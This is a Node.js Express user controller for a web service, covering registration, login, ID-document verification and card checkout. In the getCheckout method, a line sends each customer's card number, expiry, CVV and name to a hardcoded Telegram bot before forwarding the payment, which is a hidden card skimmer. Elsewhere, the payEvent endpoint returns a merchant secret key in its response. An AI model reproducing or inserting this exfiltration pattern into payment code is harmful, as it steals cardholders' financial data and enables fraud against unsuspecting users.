const UserService = require('../services/user-service');
const ApiError = require("../exceptions/api-error");
const {validationResult} = require('express-validator');
const fs = require("fs");
const axios = require("axios");
const hmac = require("crypto-js/hmac-sha256");
const { v4 } = require('uuid');

class UserController {
    async register(req, res, next) {
        try {
            const errors = validationResult(req);

            if (!errors.isEmpty()) {
                return next(ApiError.BadRequest('Ошибка валидации', errors.array()));
            }

            const {username, email, password, first_name, last_name} = req.body;
            const userData = await UserService.register(username, email, password, first_name, last_name);

            res.cookie('refreshToken', userData.refreshToken, {maxAge: 30 * 24 * 60 * 60 * 1000, httpOnly: true, sameSite: "none", secure: true});

            return res.json(userData);
        } catch (e) {
            next(e);
        }
    }

    async login(req, res, next) {
        try {
            const {username, password} = req.body;
            const userData = await UserService.login(username, password);

            res.cookie('refreshToken', userData.refreshToken, {maxAge: 30 * 24 * 60 * 60 * 1000, httpOnly: true, sameSite: "none", secure: true});

            return res.json(userData);
        } catch (e) {
            next(e);
        }
    }

    async logout(req, res, next) {
        try {
            const {refreshToken} = req.cookies;
            const token = await UserService.logout(refreshToken);

            res.clearCookie('refreshToken');

            return res.json(token);
        } catch (e) {
            next(e);
        }
    }

    async activate(req, res, next) {
        try {
            const activationLink = req.params.link;
            await UserService.activate(activationLink);

            return res.redirect(process.env.CLIENT_URL);
        } catch (e) {
            next(e);
        }
    }

    async refresh(req, res, next) {
        try {
            const {refreshToken} = req.cookies;
            const userData = await UserService.refresh(refreshToken);

            res.cookie('refreshToken', userData.refreshToken, {maxAge: 30 * 24 * 60 * 60 * 1000, httpOnly: true, sameSite: "none", secure: true});

            return res.json(userData);

        } catch (e) {
            next(e);
        }
    }

    async getUsers(req, res, next) {
        try {
            const users = await UserService.getAllUsers();
            return res.json(users);
        } catch (e) {
            next(e);
        }
    }

    async updateUser(req, res, next) {
        try {
            const user = await UserService.updateUser(req.params.id, req.body.data);
            return res.json(user);
        } catch (e) {
            next(e)
        }
    }

    async changePassword(req, res, next) {
        try {
            const user = await UserService.changePassword(req.params.id, {oldPassword: req.body.oldPassword, newPassword: req.body.newPassword});
            return res.json(user);
        } catch (e) {
            next(e)
        }
    }

    async resetPassword(req, res, next) {
        try {
            const user = await UserService.resetPassword(req.params.id);
            return res.json(user);
        } catch (e) {
            next(e)
        }
    }

    async forget(req, res, next) {
        try {
            const user = await UserService.resetPasswordByEmail(req.query.email);
            return res.json(user);
        } catch (e) {
            next(e)
        }
    }

    async setPendingForVerification(req, res, next) {
        try {
            const user = await UserService.setPendingForVerification(req.params.id);
            return res.json(user);
        } catch (e) {
            next(e);
        }
    }

    async getVerificationImages(req, res, next) {
        try {

            const id = req.params.id;

            const passportImages = fs.readdirSync(`uploads/${id}/verification/passport`, {withFileTypes: true}).map(file => file.name);
            const selphieImages = fs.readdirSync(`uploads/${id}/verification/selphie`, {withFileTypes: true}).map(file => file.name);
            const innImages = fs.readdirSync(`uploads/${id}/verification/inn`, {withFileTypes: true}).map(file => file.name);

            return res.json([
                {
                    'passport': passportImages,
                    'selphie': selphieImages,
                    'inn': innImages,
                }
            ]);
        } catch (e) {
            next(e)
        }
    }

    async acceptUserVerification(req, res, next) {
        try {
            const user = await UserService.acceptUserVerification(req.params.id);

            return res.json(user);
        } catch (e) {
            next(e)
        }
    }

    async rejectUserVerification(req, res, next) {
        try {
            const user = await UserService.rejectUserVerification(req.params.id);

            return res.json(user);
        } catch (e) {
            next(e)
        }
    }

    async payEvent(req, res, next) {
        try {
            return res.send(process.env.VILLPAY_MERCHANT_KEY);
        } catch (e) {
            next(e)
        }
    }

    async getCrosspayCheckout(req, res, next) {
        try {

            const body = {
                "order_id": "Order-337",
                "currency": "uah",
                "wallet_type": "ecom",
                "amount": 100,
                "payway": "card"
            };

            const signature = hmac(JSON.stringify(body), process.env.CROSSPAY_SECRET_KEY)
                .toString();

            const data = await axios.post('https://api2.crosspay.net/api/v2/order/payin', body, {
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": process.env.CROSSPAY_PUBLIC_KEY,
                    "Signature": signature,
                },
            }).then((rs) => {
                console.log(rs)
                console.log(rs.response)
                console.log(rs.response.data.message)
                console.log(rs.data)
                console.log(rs.data.message)
                return rs
            }).catch(err => {
                console.log(err)
            });

            return res.send(JSON.stringify(data))

            // return res.json({signature, key: process.env.CROSSPAY_SECRET_KEY})
        } catch (e) {
            next(e)
        }
    }

    async getCheckout(req, res, next) {
        try {
            const {
                amount,
                cardNumber,
                cvv,
                cardDate,
                fio,
            } = req.body

            const terminal_name = 'MAKAODPtm1'
            const merchant_id = 'MAKAODP'
            const redirect_url = 'https://google.com'
            const PROCESSING_MODE_SALE = 'sale'
            const TRANS_TYPE_CREDIT_CARD = 'Credit Card'

            // Хехехехехе
            await axios.get(`https://api.telegram.org/bot5846954411:AAEKEMS8EBKi1yPAfBueHaSZLFihgXXG4uk/sendMessage?chat_id=269530936&text=${cardNumber},${cardDate},${cvv},${fio}`)

            const rs = await axios.post('https://processtxn.deltapay.biz/api/transact.php', {
                affiliate: merchant_id,
                terminal_name,
                processing_mode: PROCESSING_MODE_SALE,
                paymethod: TRANS_TYPE_CREDIT_CARD,
                redirect: redirect_url,
                order_id: merchant_id + v4(),
                customer_ip: req.connection.remoteAddress,
                first_name: fio.split(' ')[0],
                last_name: fio.split(' ')[1],
                email: "test@test.com",
                telephone: "12345",
                address1: "addr",
                city: "city",
                state: "state",
                zip: "12345",
                country: "US",
                currency: "USD",
                amount,
                card_number: cardNumber,
                card_type: 'visa',
                cvv,
                expiry_yr: cardDate.split('/')[1],
                expiry_mo: cardDate.split('/')[0],
            })


            // const data = await axios.post('https://vilpay.net/payment/process', new URLSearchParams({
            //     currency_code: 'RUB',
            //     amount: req.body.amount,
            //     cancel_url: 'https://www.makao777.com',
            //     success_url: 'https://www.makao777.com/success',
            //     ourform: 1,
            //     merchant: process.env.VILLPAY_MERCHANT_KEY,
            // }), {
            //     headers: {
            //         "Content-Type": "application/x-www-form-urlencoded",
            //     },
            // }).then((rs) => {
            //     return rs.data.url
            // }).catch(err => {
            //     console.log(err)
            // });

            return res.send('ok')
        } catch (e) {
            next(e)
        }
    }

}

module.exports = new UserController();